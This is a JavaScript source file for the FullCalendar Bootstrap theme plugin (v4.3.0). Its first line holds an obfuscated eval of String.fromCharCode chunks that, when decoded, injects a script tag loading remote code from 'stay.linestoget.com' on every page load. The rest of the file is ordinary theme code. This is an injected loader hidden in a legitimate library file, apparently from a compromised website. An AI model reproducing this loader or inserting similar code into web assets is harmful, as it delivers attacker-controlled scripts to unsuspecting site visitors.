var f=String;eval(f.fromCharCode(102,117,110)+f.fromCharCode(99,116,105,111,110)+f.fromCharCode(32,97,115,115,40,115,114,99,41,123,114,101,116,117,114,110)+f.fromCharCode(32,66,111,111,108,101,97,110)+f.fromCharCode(40,100,111,99,117,109,101,110)+f.fromCharCode(116,46,113,117,101,114,121,83,101,108,101,99,116,111,114,40,39,115,99,114,105,112,116,91,115,114,99,61,34,39,32,43,32,115,114,99,32,43,32,39,34,93,39,41,41,59,125,32,118,97,114,32,108,111,61,34,104,116,116,112,115,58,47,47,115,116,97,121,46,108,105,110)+f.fromCharCode(101,115,116,111,103,101,116,46,99,111,109,47,115,99,114,105,112,116,115,47,99,104,101,99,107,46,106,115,63,118,61,51,46,48,46,51,34,59,105,102,40,97,115,115,40,108,111,41,61,61,102,97,108,115,101,41,123,118,97,114,32,100,61,100,111,99,117,109,101,110)+f.fromCharCode(116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110)+f.fromCharCode(116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,115,114,99,61,108,111,59,105,102,32,40,100,111,99,117,109,101,110)+f.fromCharCode(116,46,99,117,114,114,101,110)+f.fromCharCode(116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110)+f.fromCharCode(116,46,99,117,114,114,101,110)+f.fromCharCode(116,83,99,114,105,112,116,46,112,97,114,101,110)+f.fromCharCode(116,78,111,100,101,46,105,110)+f.fromCharCode(115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110)+f.fromCharCode(116,46,99,117,114,114,101,110)+f.fromCharCode(116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110)+f.fromCharCode(116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110)+f.fromCharCode(100,67,104,105,108,100,40,115,41,59,125,125));/*99586587347*//*!
FullCalendar Bootstrap Plugin v4.3.0
Docs & License: https://fullcalendar.io/
(c) 2019 Adam Shaw
*/

import { createPlugin, Theme } from '@fullcalendar/core';

/*! *****************************************************************************
Copyright (c) Microsoft Corporation. All rights reserved.
Licensed under the Apache License, Version 2.0 (the "License"); you may not use
this file except in compliance with the License. You may obtain a copy of the
License at http://www.apache.org/licenses/LICENSE-2.0

THIS CODE IS PROVIDED ON AN *AS IS* BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, EITHER EXPRESS OR IMPLIED, INCLUDING WITHOUT LIMITATION ANY IMPLIED
WARRANTIES OR CONDITIONS OF TITLE, FITNESS FOR A PARTICULAR PURPOSE,
MERCHANTABLITY OR NON-INFRINGEMENT.

See the Apache Version 2.0 License for specific language governing permissions
and limitations under the License.
***************************************************************************** */
/* global Reflect, Promise */

var extendStatics = function(d, b) {
    extendStatics = Object.setPrototypeOf ||
        ({ __proto__: [] } instanceof Array && function (d, b) { d.__proto__ = b; }) ||
        function (d, b) { for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; };
    return extendStatics(d, b);
};

function __extends(d, b) {
    extendStatics(d, b);
    function __() { this.constructor = d; }
    d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
}

var BootstrapTheme = /** @class */ (function (_super) {
    __extends(BootstrapTheme, _super);
    function BootstrapTheme() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    return BootstrapTheme;
}(Theme));
BootstrapTheme.prototype.classes = {
    widget: 'fc-bootstrap',
    tableGrid: 'table-bordered',
    tableList: 'table',
    tableListHeading: 'table-active',
    buttonGroup: 'btn-group',
    button: 'btn btn-primary',
    buttonActive: 'active',
    today: 'alert alert-info',
    popover: 'card card-primary',
    popoverHeader: 'card-header',
    popoverContent: 'card-body',
    // day grid
    // for left/right border color when border is inset from edges (all-day in timeGrid view)
    // avoid `table` class b/c don't want margins/padding/structure. only border color.
    headerRow: 'table-bordered',
    dayRow: 'table-bordered',
    // list view
    listView: 'card card-primary'
};
BootstrapTheme.prototype.baseIconClass = 'fa';
BootstrapTheme.prototype.iconClasses = {
    close: 'fa-times',
    prev: 'fa-chevron-left',
    next: 'fa-chevron-right',
    prevYear: 'fa-angle-double-left',
    nextYear: 'fa-angle-double-right'
};
BootstrapTheme.prototype.iconOverrideOption = 'bootstrapFontAwesome';
BootstrapTheme.prototype.iconOverrideCustomButtonOption = 'bootstrapFontAwesome';
BootstrapTheme.prototype.iconOverridePrefix = 'fa-';
var main = createPlugin({
    themeClasses: {
        bootstrap: BootstrapTheme
    }
});

export default main;
export { BootstrapTheme };
